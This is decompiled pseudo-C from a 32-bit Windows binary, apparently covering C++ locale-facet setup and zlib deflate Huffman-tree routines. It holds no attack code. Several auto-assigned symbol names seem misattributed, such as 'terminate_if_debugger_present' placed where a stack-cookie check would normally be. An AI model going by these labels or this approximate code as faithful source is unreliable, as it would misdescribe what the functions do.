LAB_003a8b36:
        local_c = CONCAT31(local_c._1_3_,1);
      }
      else {
        if ((*(int *)param_4[9] == 0) || (piVar1 = (int *)param_4[0xd], *piVar1 < 1)) {
          uVar7 = (**(code **)(*param_4 + 0xc))(unaff_BL);
        }
        else {
          *piVar1 = *piVar1 + -1;
          pbVar2 = *(byte **)param_4[9];
          *(byte **)param_4[9] = pbVar2 + 1;
          *pbVar2 = unaff_BL;
          uVar7 = (uint)unaff_BL;
        }
        if (uVar7 == 0xffffffff) goto LAB_003a8b36;
      }
      param_3 = local_c;
    }
    in_EAX = (void *)((int)in_EAX + sVar5 + 1);
    param_2 = (param_2 - sVar5) - 1;
  } while( true );
}



void __fastcall FUN_003a8b70(int *param_1)

{
  (**(code **)(*param_1 + 0xc))();
  return;
}



void FUN_003a8b90(void)

{
  int unaff_ESI;
  
  FUN_003b14b9(*(void **)(unaff_ESI + 8));
  FUN_003b14b9(*(void **)(unaff_ESI + 0x10));
  FUN_003b14b9(*(void **)(unaff_ESI + 0x14));
  return;
}



undefined * FUN_003a8bb0(void)

{
  undefined *puVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined extraout_DL;
  int *unaff_EDI;
  int **in_FS_OFFSET;
  undefined *local_28 [3];
  int local_1c;
  int local_18;
  undefined *local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2c98;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  std::_Lockit::_Lockit((_Lockit *)&local_1c,0);
  puVar1 = DAT_003d9824;
  local_8 = 0;
  local_14 = DAT_003d9824;
  if (DAT_003ea034 == 0) {
    std::_Lockit::_Lockit((_Lockit *)&local_18,0);
    if (DAT_003ea034 == 0) {
      DAT_003d7b04 = DAT_003d7b04 + 1;
      DAT_003ea034 = DAT_003d7b04;
    }
    FUN_003ae995(&local_18);
  }
  uVar2 = DAT_003ea034;
  iVar3 = *unaff_EDI;
  if (DAT_003ea034 < *(uint *)(iVar3 + 0xc)) {
    puVar4 = *(undefined **)(*(int *)(iVar3 + 8) + DAT_003ea034 * 4);
    if (puVar4 == (undefined *)0x0) goto LAB_003a8c3c;
LAB_003a8c5a:
    if (puVar4 != (undefined *)0x0) goto LAB_003a8cc3;
  }
  else {
    puVar4 = (undefined *)0x0;
LAB_003a8c3c:
    if (*(char *)(iVar3 + 0x14) == '\0') goto LAB_003a8c5a;
    iVar3 = _ENGINE_get_table_flags();
    if (uVar2 < *(uint *)(iVar3 + 0xc)) {
      puVar4 = *(undefined **)(*(int *)(iVar3 + 8) + uVar2 * 4);
      goto LAB_003a8c5a;
    }
  }
  puVar4 = puVar1;
  if (puVar1 == (undefined *)0x0) {
    iVar3 = FUN_003a8e30(&local_14);
    puVar4 = local_14;
    if (iVar3 == -1) {
      FUN_003b0a93(local_28,extraout_DL,0xc);
                    // WARNING: Subroutine does not return
      __CxxThrowException_8(local_28,&DAT_003d320c);
    }
    DAT_003d9824 = local_14;
    std::_Lockit::_Lockit((_Lockit *)&local_18,0);
    if (*(int *)(puVar4 + 4) != -1) {
      *(int *)(puVar4 + 4) = *(int *)(puVar4 + 4) + 1;
    }
    FUN_003ae995(&local_18);
    Facet_Register(puVar4);
  }
LAB_003a8cc3:
  local_8 = 0xffffffff;
  FUN_003ae995(&local_1c);
  *in_FS_OFFSET = local_10;
  return puVar4;
}



undefined * FUN_003a8cf0(void)

{
  undefined *puVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined extraout_DL;
  int *unaff_EDI;
  int **in_FS_OFFSET;
  undefined *local_28 [3];
  int local_1c;
  int local_18;
  undefined *local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2c98;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  std::_Lockit::_Lockit((_Lockit *)&local_1c,0);
  puVar1 = DAT_003d9828;
  local_8 = 0;
  local_14 = DAT_003d9828;
  if (DAT_003ea038 == 0) {
    std::_Lockit::_Lockit((_Lockit *)&local_18,0);
    if (DAT_003ea038 == 0) {
      DAT_003d7b04 = DAT_003d7b04 + 1;
      DAT_003ea038 = DAT_003d7b04;
    }
    FUN_003ae995(&local_18);
  }
  uVar2 = DAT_003ea038;
  iVar3 = *unaff_EDI;
  if (DAT_003ea038 < *(uint *)(iVar3 + 0xc)) {
    puVar4 = *(undefined **)(*(int *)(iVar3 + 8) + DAT_003ea038 * 4);
    if (puVar4 == (undefined *)0x0) goto LAB_003a8d7c;
LAB_003a8d9a:
    if (puVar4 != (undefined *)0x0) goto LAB_003a8e03;
  }
  else {
    puVar4 = (undefined *)0x0;
LAB_003a8d7c:
    if (*(char *)(iVar3 + 0x14) == '\0') goto LAB_003a8d9a;
    iVar3 = _ENGINE_get_table_flags();
    if (uVar2 < *(uint *)(iVar3 + 0xc)) {
      puVar4 = *(undefined **)(*(int *)(iVar3 + 8) + uVar2 * 4);
      goto LAB_003a8d9a;
    }
  }
  puVar4 = puVar1;
  if (puVar1 == (undefined *)0x0) {
    iVar3 = FUN_003a8ef0(&local_14);
    puVar4 = local_14;
    if (iVar3 == -1) {
      FUN_003b0a93(local_28,extraout_DL,0xc);
                    // WARNING: Subroutine does not return
      __CxxThrowException_8(local_28,&DAT_003d320c);
    }
    DAT_003d9828 = local_14;
    std::_Lockit::_Lockit((_Lockit *)&local_18,0);
    if (*(int *)(puVar4 + 4) != -1) {
      *(int *)(puVar4 + 4) = *(int *)(puVar4 + 4) + 1;
    }
    FUN_003ae995(&local_18);
    Facet_Register(puVar4);
  }
LAB_003a8e03:
  local_8 = 0xffffffff;
  FUN_003ae995(&local_1c);
  *in_FS_OFFSET = local_10;
  return puVar4;
}



undefined4 __cdecl FUN_003a8e30(undefined **param_1)

{
  _Cvtvec *p_Var1;
  undefined **ppuVar2;
  undefined *extraout_EDX;
  int **in_FS_OFFSET;
  int local_38 [9];
  undefined **local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2d0b;
  local_10 = *in_FS_OFFSET;
  p_Var1 = (_Cvtvec *)(DAT_003d6664 ^ (uint)&stack0xfffffffc);
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = (undefined **)0x0;
  if ((param_1 != (undefined **)0x0) && (*param_1 == (undefined *)0x0)) {
    ppuVar2 = (undefined **)FUN_003b103e(0x10);
    local_8 = 0;
    local_14 = ppuVar2;
    if (ppuVar2 == (undefined **)0x0) {
      ppuVar2 = (undefined **)0x0;
    }
    else {
      FUN_00399290((_Lockit *)local_38);
      ppuVar2[1] = (undefined *)0x0;
      *ppuVar2 = (undefined *)
                 std::
                 num_put<char,class_std::ostreambuf_iterator<char,struct_std::char_traits<char>_>_>
                 ::vftable;
      p_Var1 = __Getcvt(p_Var1);
      ppuVar2[2] = (undefined *)p_Var1;
      ppuVar2[3] = extraout_EDX;
    }
    local_8 = 0xffffffff;
    *param_1 = (undefined *)ppuVar2;
    if (ppuVar2 != (undefined **)0x0) {
      FUN_00399330(local_38);
    }
  }
  *in_FS_OFFSET = local_10;
  return 4;
}



undefined4 __cdecl FUN_003a8ef0(undefined **param_1)

{
  undefined **ppuVar1;
  int **in_FS_OFFSET;
  int local_3c [9];
  undefined **local_18;
  undefined4 local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2c6d;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = 0;
  if ((param_1 != (undefined **)0x0) && (*param_1 == (undefined *)0x0)) {
    ppuVar1 = (undefined **)FUN_003b103e(0x18);
    local_8 = 0;
    local_18 = ppuVar1;
    if (ppuVar1 == (undefined **)0x0) {
      ppuVar1 = (undefined **)0x0;
    }
    else {
      FUN_00399290((_Lockit *)local_3c);
      local_14 = 1;
      ppuVar1[1] = (undefined *)0x0;
      local_8 = 2;
      *ppuVar1 = (undefined *)std::numpunct<char>::vftable;
      FUN_003a8fb0((int)ppuVar1);
    }
    *param_1 = (undefined *)ppuVar1;
    local_8 = 0xffffffff;
    if (ppuVar1 != (undefined **)0x0) {
      FUN_00399330(local_3c);
    }
  }
  *in_FS_OFFSET = local_10;
  return 4;
}



void FUN_003a8fb0(int param_1)

{
  _Cvtvec *__return_storage_ptr__;
  lconv *plVar1;
  size_t sVar2;
  undefined *puVar3;
  char *pcVar4;
  undefined *puVar5;
  char *pcVar6;
  _Cvtvec *unaff_EBX;
  undefined1 *puVar7;
  char *pcVar8;
  _Cvtvec *unaff_ESI;
  _Cvtvec *unaff_EDI;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2bd0;
  local_10 = *in_FS_OFFSET;
  __return_storage_ptr__ = (_Cvtvec *)(DAT_003d6664 ^ (uint)&stack0xfffffffc);
  *in_FS_OFFSET = (int *)&local_10;
  plVar1 = _localeconv();
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  local_8 = 0;
  puVar7 = &DAT_003ce656;
  __Getcvt(__return_storage_ptr__);
  sVar2 = _strlen("");
  sVar2 = sVar2 + 1;
  puVar3 = (undefined *)FUN_003ae40b(sVar2);
  puVar5 = puVar3;
  for (; sVar2 != 0; sVar2 = sVar2 - 1) {
    *puVar5 = *puVar7;
    puVar5 = puVar5 + 1;
    puVar7 = puVar7 + 1;
  }
  *(undefined **)(param_1 + 8) = puVar3;
  __Getcvt(unaff_EDI);
  pcVar8 = "false";
  sVar2 = _strlen("false");
  sVar2 = sVar2 + 1;
  pcVar4 = (char *)FUN_003ae40b(sVar2);
  pcVar6 = pcVar4;
  for (; sVar2 != 0; sVar2 = sVar2 - 1) {
    *pcVar6 = *pcVar8;
    pcVar6 = pcVar6 + 1;
    pcVar8 = pcVar8 + 1;
  }
  *(char **)(param_1 + 0x10) = pcVar4;
  __Getcvt(unaff_ESI);
  puVar7 = &DAT_003d096c;
  sVar2 = _strlen("true");
  sVar2 = sVar2 + 1;
  puVar3 = (undefined *)FUN_003ae40b(sVar2);
  puVar5 = puVar3;
  for (; sVar2 != 0; sVar2 = sVar2 - 1) {
    *puVar5 = *puVar7;
    puVar5 = puVar5 + 1;
    puVar7 = puVar7 + 1;
  }
  *(undefined **)(param_1 + 0x14) = puVar3;
  __Getcvt(unaff_EBX);
  *(char *)(param_1 + 0xc) = *plVar1->decimal_point;
  __Getcvt(unaff_EBX);
  *(char *)(param_1 + 0xd) = *plVar1->thousands_sep;
  __Getcvt(unaff_EBX);
  *(undefined *)(param_1 + 0xc) = 0x2e;
  __Getcvt(unaff_EBX);
  *(undefined *)(param_1 + 0xd) = 0x2c;
  *in_FS_OFFSET = local_10;
  return;
}



void Catch_All_003a90cf(void)

{
  FUN_003a8b90();
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



void FUN_003aa110(void)

{
  int in_EAX;
  int iVar1;
  int *piVar2;
  int *piVar3;
  int local_20 [2];
  undefined4 *local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  local_20[1] = in_EAX + 0x9e8;
  local_18 = &DAT_003ce850;
  local_14 = 0x101;
  local_10 = 0x11e;
  local_c = 0xf;
  local_8 = 0;
  piVar2 = local_20;
  piVar3 = (int *)(in_EAX + 0xf7c);
  for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {
    *piVar3 = *piVar2;
    piVar2 = piVar2 + 1;
    piVar3 = piVar3 + 1;
  }
  local_20[0] = in_EAX + 0x8f4;
  local_20[1] = in_EAX + 0xe68;
  local_18 = &DAT_003ce8d8;
  local_14 = 0;
  local_10 = 0x1e;
  local_c = 0xf;
  local_8 = 0;
  piVar2 = local_20;
  piVar3 = (int *)(in_EAX + 0xf98);
  for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {
    *piVar3 = *piVar2;
    piVar2 = piVar2 + 1;
    piVar3 = piVar3 + 1;
  }
  local_20[0] = in_EAX + 0xee0;
  local_20[1] = 0;
  local_18 = (undefined4 *)&DAT_003ce950;
  local_14 = 0;
  local_10 = 0x13;
  local_c = 7;
  local_8 = 0;
  piVar2 = local_20;
  piVar3 = (int *)(in_EAX + 0xfb4);
  for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {
    *piVar3 = *piVar2;
    piVar2 = piVar2 + 1;
    piVar3 = piVar3 + 1;
  }
  *(undefined4 *)(in_EAX + 0x1af18) = 0;
  *(undefined4 *)(in_EAX + 0x1af1c) = 0;
  *(undefined4 *)(in_EAX + 0x1af20) = 0;
  return;
}



void FUN_003aa1f0(void)

{
  char cVar1;
  uint uVar2;
  undefined4 in_EAX;
  int iVar3;
  undefined2 *puVar4;
  uint uVar5;
  ushort *puVar6;
  uint uVar7;
  undefined4 *puVar8;
  uint uVar9;
  int unaff_ESI;
  int iVar10;
  int iVar11;
  uint uVar12;
  int *local_c;
  int *local_8;
  
  *(undefined4 *)(unaff_ESI + 0x1af50) = in_EAX;
  *(undefined4 *)(unaff_ESI + 0x1af48) = 0;
  *(undefined4 *)(unaff_ESI + 0x1af44) = 0;
  *(undefined4 *)(unaff_ESI + 0x1af4c) = 0;
  if (*(short *)(unaff_ESI + 0xe7e) == 0) {
    local_c = (int *)(unaff_ESI + 0x1e40);
    iVar3 = 0;
    cVar1 = '\0';
    puVar8 = &DAT_003ce850;
    do {
      iVar10 = 0;
      *local_c = iVar3;
      if (0 < 1 << ((byte)*puVar8 & 0x1f)) {
        do {
          *(char *)(unaff_ESI + 0x1b3d + iVar3) = cVar1;
          iVar10 = iVar10 + 1;
          iVar3 = iVar3 + 1;
        } while (iVar10 < 1 << ((byte)*puVar8 & 0x1f));
      }
      local_c = local_c + 1;
      cVar1 = cVar1 + '\x01';
      puVar8 = puVar8 + 1;
    } while ((int)puVar8 < 0x3ce8c0);
    *(char *)(iVar3 + 0x1b3c + unaff_ESI) = cVar1;
    local_8 = (int *)(unaff_ESI + 0x1eb4);
    iVar3 = 0;
    iVar10 = 0;
    puVar8 = &DAT_003ce8d8;
    do {
      *local_8 = iVar3;
      local_c = (int *)0x0;
      if (0 < 1 << ((byte)*puVar8 & 0x1f)) {
        do {
          local_c = (int *)((int)local_c + 1);
          *(char *)(unaff_ESI + 0x1c3d + iVar3) = (char)iVar10;
          iVar3 = iVar3 + 1;
        } while ((int)local_c < 1 << ((byte)*puVar8 & 0x1f));
      }
      local_8 = local_8 + 1;
      puVar8 = puVar8 + 1;
      iVar10 = iVar10 + 1;
    } while ((int)puVar8 < 0x3ce918);
    iVar3 = iVar3 >> 7;
    if (iVar10 < 0x1e) {
      puVar8 = &DAT_003ce8d8 + iVar10;
      local_c = (int *)(unaff_ESI + 0x1eb4 + iVar10 * 4);
      do {
        *local_c = iVar3 << 7;
        iVar11 = 0;
        if (0 < 1 << ((char)*puVar8 - 7U & 0x1f)) {
          do {
            *(char *)(unaff_ESI + 0x1d3d + iVar3) = (char)iVar10;
            iVar11 = iVar11 + 1;
            iVar3 = iVar3 + 1;
          } while (iVar11 < 1 << ((char)*puVar8 - 7U & 0x1f));
        }
        local_c = local_c + 1;
        puVar8 = puVar8 + 1;
        iVar10 = iVar10 + 1;
      } while ((int)puVar8 < 0x3ce950);
    }
    *(undefined4 *)(unaff_ESI + 0xfe4) = 0;
    *(undefined4 *)(unaff_ESI + 0xfe8) = 0;
    *(undefined4 *)(unaff_ESI + 0xfec) = 0;
    *(undefined4 *)(unaff_ESI + 0xff0) = 0;
    *(undefined4 *)(unaff_ESI + 0xff4) = 0;
    *(undefined4 *)(unaff_ESI + 0xff8) = 0;
    *(undefined4 *)(unaff_ESI + 0xffc) = 0;
    *(undefined4 *)(unaff_ESI + 0x1000) = 0;
    puVar4 = (undefined2 *)(unaff_ESI + 0xa02);
    iVar3 = 0x18;
    do {
      puVar4[-2] = 8;
      *(short *)(unaff_ESI + 0xff4) = *(short *)(unaff_ESI + 0xff4) + 1;
      *puVar4 = 8;
      *(short *)(unaff_ESI + 0xff4) = *(short *)(unaff_ESI + 0xff4) + 1;
      puVar4[2] = 8;
      *(short *)(unaff_ESI + 0xff4) = *(short *)(unaff_ESI + 0xff4) + 1;
      puVar4[4] = 8;
      *(short *)(unaff_ESI + 0xff4) = *(short *)(unaff_ESI + 0xff4) + 1;
      puVar4[6] = 8;
      *(short *)(unaff_ESI + 0xff4) = *(short *)(unaff_ESI + 0xff4) + 1;
      puVar4[8] = 8;
      *(short *)(unaff_ESI + 0xff4) = *(short *)(unaff_ESI + 0xff4) + 1;
      puVar4 = puVar4 + 0xc;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    puVar4 = (undefined2 *)(unaff_ESI + 0xc3e);
    iVar3 = 0x70;
    do {
      *puVar4 = 9;
      *(short *)(unaff_ESI + 0xff6) = *(short *)(unaff_ESI + 0xff6) + 1;
      puVar4 = puVar4 + 2;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    iVar3 = 0x18;
    puVar4 = (undefined2 *)(unaff_ESI + 0xdfe);
    do {
      *puVar4 = 7;
      *(short *)(unaff_ESI + 0xff2) = *(short *)(unaff_ESI + 0xff2) + 1;
      puVar4 = puVar4 + 2;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    puVar4 = (undefined2 *)(unaff_ESI + 0xe5e);
    iVar3 = 8;
    do {
      *puVar4 = 8;
      *(short *)(unaff_ESI + 0xff4) = *(short *)(unaff_ESI + 0xff4) + 1;
      puVar4 = puVar4 + 2;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    FUN_003aa870(0,unaff_ESI,0x11f);
    puVar6 = (ushort *)(unaff_ESI + 0xe7c);
    uVar12 = 0;
    do {
      puVar6[1] = 5;
      iVar3 = 5;
      uVar2 = 0;
      uVar7 = uVar12;
      do {
        uVar5 = uVar2;
        uVar9 = uVar7 & 1;
        iVar3 = iVar3 + -1;
        uVar7 = uVar7 >> 1;
        uVar2 = (uVar5 | uVar9) * 2;
      } while (0 < iVar3);
      *puVar6 = (ushort)uVar5 | (ushort)uVar9;
      uVar12 = uVar12 + 1;
      puVar6 = puVar6 + 2;
    } while ((int)uVar12 < 0x1e);
    FUN_003aa4f0();
  }
  return;
}



void FUN_003aa4f0(void)

{
  int in_EAX;
  undefined2 *puVar1;
  int iVar2;
  
  puVar1 = (undefined2 *)(in_EAX + 0x14);
  iVar2 = 0x11e;
  do {
    *puVar1 = 0;
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined2 *)(in_EAX + 0x908);
  iVar2 = 0x1e;
  do {
    *puVar1 = 0;
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined2 *)(in_EAX + 0xef4);
  iVar2 = 0x13;
  do {
    *puVar1 = 0;
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  *(undefined2 *)(in_EAX + 0x414) = 1;
  *(undefined4 *)(in_EAX + 0x1af40) = 0;
  *(undefined4 *)(in_EAX + 0x1af3c) = 0;
  *(undefined4 *)(in_EAX + 0x1af34) = 0;
  *(undefined4 *)(in_EAX + 0x1af30) = 0;
  *(undefined4 *)(in_EAX + 0x1af2c) = 0;
  *(undefined2 *)(in_EAX + 0x1af38) = 0x100;
  return;
}



void __cdecl FUN_003aa580(int param_1)

{
  byte *pbVar1;
  byte bVar2;
  ushort uVar3;
  ushort uVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int in_EAX;
  int iVar8;
  int iVar9;
  int unaff_EDI;
  bool bVar10;
  
  iVar9 = *(int *)(in_EAX + 0x18f8);
  iVar5 = *(int *)(in_EAX + 0x1004 + param_1 * 4);
  iVar8 = param_1 * 2;
  bVar10 = SBORROW4(iVar8,iVar9);
  iVar7 = iVar8 - iVar9;
  if (iVar9 < iVar8) {
    *(int *)(in_EAX + 0x1004 + param_1 * 4) = iVar5;
    return;
  }
  while( true ) {
    iVar9 = iVar8;
    if (bVar10 != iVar7 < 0) {
      iVar7 = *(int *)(in_EAX + 0x1008 + iVar8 * 4);
      uVar3 = *(ushort *)(unaff_EDI + iVar7 * 4);
      uVar4 = *(ushort *)(unaff_EDI + *(int *)(in_EAX + 0x1004 + iVar8 * 4) * 4);
      if ((uVar3 < uVar4) ||
         ((uVar3 == uVar4 &&
          (bVar2 = *(byte *)(iVar7 + 0x1900 + in_EAX),
          pbVar1 = (byte *)(*(int *)(in_EAX + 0x1004 + iVar8 * 4) + 0x1900 + in_EAX),
          bVar2 < *pbVar1 || bVar2 == *pbVar1)))) {
        iVar9 = iVar8 + 1;
      }
    }
    iVar7 = *(int *)(in_EAX + 0x1004 + iVar9 * 4);
    uVar3 = *(ushort *)(unaff_EDI + iVar5 * 4);
    uVar4 = *(ushort *)(unaff_EDI + iVar7 * 4);
    if ((uVar3 < uVar4) ||
       ((uVar3 == uVar4 &&
        (bVar2 = *(byte *)(iVar5 + 0x1900 + in_EAX), pbVar1 = (byte *)(iVar7 + 0x1900 + in_EAX),
        bVar2 < *pbVar1 || bVar2 == *pbVar1)))) break;
    *(int *)(in_EAX + 0x1004 + param_1 * 4) = iVar7;
    iVar6 = *(int *)(in_EAX + 0x18f8);
    iVar8 = iVar9 * 2;
    bVar10 = SBORROW4(iVar8,iVar6);
    iVar7 = iVar8 - iVar6;
    param_1 = iVar9;
    if (iVar6 < iVar8) {
      *(int *)(in_EAX + 0x1004 + iVar9 * 4) = iVar5;
      return;
    }
  }
  *(int *)(in_EAX + 0x1004 + param_1 * 4) = iVar5;
  return;
}



void __fastcall FUN_003aa660(int *param_1)

{
  short sVar1;
  ushort uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int in_EAX;
  int iVar8;
  int iVar9;
  short *psVar10;
  int iVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  ushort *puVar15;
  int local_1c;
  int local_14;
  int *local_10;
  int local_c;
  
  iVar9 = param_1[2];
  iVar3 = param_1[3];
  iVar4 = param_1[6];
  iVar13 = param_1[5];
  iVar5 = *param_1;
  iVar6 = param_1[1];
  *(undefined4 *)(in_EAX + 0xfe4) = 0;
  *(undefined4 *)(in_EAX + 0xfe8) = 0;
  *(undefined4 *)(in_EAX + 0xfec) = 0;
  *(undefined4 *)(in_EAX + 0xff0) = 0;
  *(undefined4 *)(in_EAX + 0xff4) = 0;
  *(undefined4 *)(in_EAX + 0xff8) = 0;
  *(undefined4 *)(in_EAX + 0xffc) = 0;
  *(undefined4 *)(in_EAX + 0x1000) = 0;
  *(undefined2 *)(iVar5 + 2 + *(int *)(in_EAX + 0x1004 + *(int *)(in_EAX + 0x18fc) * 4) * 4) = 0;
  iVar11 = 0;
  local_14 = *(int *)(in_EAX + 0x18fc) + 1;
  local_c = 0;
  if (local_14 < 0x23d) {
    local_10 = (int *)(in_EAX + 0x1004 + local_14 * 4);
    local_1c = 0x23d - local_14;
    local_14 = local_14 + local_1c;
    do {
      iVar7 = *local_10;
      iVar8 = *(ushort *)(iVar5 + 2 + (uint)*(ushort *)(iVar5 + 2 + iVar7 * 4) * 4) + 1;
      if (iVar13 < iVar8) {
        iVar11 = iVar11 + 1;
        iVar8 = iVar13;
        local_c = iVar11;
      }
      *(short *)(iVar5 + 2 + iVar7 * 4) = (short)iVar8;
      if (iVar7 <= iVar4) {
        psVar10 = (short *)(in_EAX + 0xfe4 + iVar8 * 2);
        *psVar10 = *psVar10 + 1;
        iVar14 = 0;
        if (iVar3 <= iVar7) {
          iVar14 = *(int *)(iVar9 + (iVar7 - iVar3) * 4);
        }
        uVar12 = (uint)*(ushort *)(iVar5 + iVar7 * 4);
        *(int *)(in_EAX + 0x1af3c) = *(int *)(in_EAX + 0x1af3c) + (iVar8 + iVar14) * uVar12;
        iVar11 = local_c;
        if (iVar6 != 0) {
          *(int *)(in_EAX + 0x1af40) =
               *(int *)(in_EAX + 0x1af40) +
               ((uint)*(ushort *)(iVar6 + 2 + iVar7 * 4) + iVar14) * uVar12;
        }
      }
      local_10 = local_10 + 1;
      local_1c = local_1c + -1;
    } while (local_1c != 0);
    if (iVar11 != 0) {
      puVar15 = (ushort *)(in_EAX + 0xfe4 + iVar13 * 2);
      do {
        iVar9 = iVar13 + -1;
        psVar10 = (short *)(in_EAX + 0xfe4 + iVar9 * 2);
        sVar1 = *(short *)(in_EAX + 0xfe4 + iVar9 * 2);
        while (sVar1 == 0) {
          psVar10 = psVar10 + -1;
          iVar9 = iVar9 + -1;
          sVar1 = *psVar10;
        }
        psVar10 = (short *)(in_EAX + 0xfe6 + iVar9 * 2);
        *psVar10 = *psVar10 + 2;
        psVar10 = (short *)(in_EAX + 0xfe4 + iVar9 * 2);
        *psVar10 = *psVar10 + -1;
        *puVar15 = *puVar15 - 1;
        iVar11 = iVar11 + -2;
      } while (0 < iVar11);
      for (; iVar13 != 0; iVar13 = iVar13 + -1) {
        local_10 = (int *)(uint)*puVar15;
        if (local_10 != (int *)0x0) {
          iVar9 = in_EAX + 0x1004 + local_14 * 4;
          do {
            iVar3 = *(int *)(iVar9 + -4);
            local_14 = local_14 + -1;
            iVar9 = iVar9 + -4;
            if (iVar3 <= iVar4) {
              uVar2 = *(ushort *)(iVar5 + 2 + iVar3 * 4);
              if (uVar2 != (ushort)iVar13) {
                *(int *)(in_EAX + 0x1af3c) =
                     *(int *)(in_EAX + 0x1af3c) +
                     (iVar13 - (uint)uVar2) * (uint)*(ushort *)(iVar5 + iVar3 * 4);
                *(ushort *)(iVar5 + 2 + iVar3 * 4) = (ushort)iVar13;
              }
              local_10 = (int *)((int)local_10 - 1);
            }
          } while (local_10 != (int *)0x0);
        }
        puVar15 = puVar15 + -1;
      }
    }
  }
  return;
}



void __fastcall FUN_003aa870(undefined4 param_1,int param_2,int param_3)

{
  uint uVar1;
  short sVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  short *psVar6;
  uint uVar7;
  int unaff_EDI;
  undefined1 in_stack_ffffffd8;
  ushort local_26 [15];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  sVar2 = 0;
  iVar5 = 1;
  psVar6 = (short *)(param_2 + 0xfe4);
  do {
    sVar2 = (*psVar6 + sVar2) * 2;
    *(short *)(&stack0xffffffd8 + iVar5 * 2) = sVar2;
    iVar5 = iVar5 + 1;
    psVar6 = psVar6 + 1;
  } while (iVar5 < 0x10);
  iVar5 = 0;
  if (-1 < param_3) {
    do {
      psVar6 = (short *)(uint)*(ushort *)(unaff_EDI + 2 + iVar5 * 4);
      if (psVar6 != (short *)0x0) {
        uVar3 = (uint)*(ushort *)(&stack0xffffffd8 + (int)psVar6 * 2);
        *(ushort *)(&stack0xffffffd8 + (int)psVar6 * 2) =
             *(ushort *)(&stack0xffffffd8 + (int)psVar6 * 2) + 1;
        uVar1 = 0;
        do {
          uVar4 = uVar1;
          uVar7 = uVar3 & 1;
          psVar6 = (short *)((int)psVar6 + -1);
          uVar3 = uVar3 >> 1;
          uVar1 = (uVar4 | uVar7) * 2;
        } while (0 < (int)psVar6);
        *(ushort *)(unaff_EDI + iVar5 * 4) = (ushort)uVar4 | (ushort)uVar7;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 <= param_3);
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,psVar6,in_stack_ffffffd8);
  return;
}



void __cdecl FUN_003aa900(int *param_1)

{
  byte bVar1;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 extraout_ECX;
  byte bVar5;
  int iVar6;
  int unaff_ESI;
  int local_c;
  int local_8;
  
  local_c = param_1[4];
  iVar6 = param_1[1];
  iVar2 = *param_1;
  iVar4 = 0;
  local_8 = -1;
  *(undefined4 *)(unaff_ESI + 0x18f8) = 0;
  *(undefined4 *)(unaff_ESI + 0x18fc) = 0x23d;
  if (0 < local_c) {
    do {
      if (*(short *)(iVar2 + iVar4 * 4) == 0) {
        *(undefined2 *)(iVar2 + 2 + iVar4 * 4) = 0;
      }
      else {
        *(int *)(unaff_ESI + 0x18f8) = *(int *)(unaff_ESI + 0x18f8) + 1;
        *(int *)(unaff_ESI + 0x1004 + *(int *)(unaff_ESI + 0x18f8) * 4) = iVar4;
        *(undefined *)(iVar4 + 0x1900 + unaff_ESI) = 0;
        local_8 = iVar4;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < local_c);
  }
  iVar4 = *(int *)(unaff_ESI + 0x18f8);
  while (iVar4 < 2) {
    if (local_8 < 2) {
      iVar4 = local_8 + 1;
      local_8 = iVar4;
    }
    else {
      iVar4 = 0;
    }
    *(int *)(unaff_ESI + 0x18f8) = *(int *)(unaff_ESI + 0x18f8) + 1;
    *(int *)(unaff_ESI + 0x1004 + *(int *)(unaff_ESI + 0x18f8) * 4) = iVar4;
    *(undefined2 *)(iVar2 + iVar4 * 4) = 1;
    *(undefined *)(unaff_ESI + 0x1900 + iVar4) = 0;
    *(int *)(unaff_ESI + 0x1af3c) = *(int *)(unaff_ESI + 0x1af3c) + -1;
    if (iVar6 != 0) {
      *(int *)(unaff_ESI + 0x1af40) =
           *(int *)(unaff_ESI + 0x1af40) - (uint)*(ushort *)(iVar6 + 2 + iVar4 * 4);
    }
    iVar4 = *(int *)(unaff_ESI + 0x18f8);
  }
  param_1[6] = local_8;
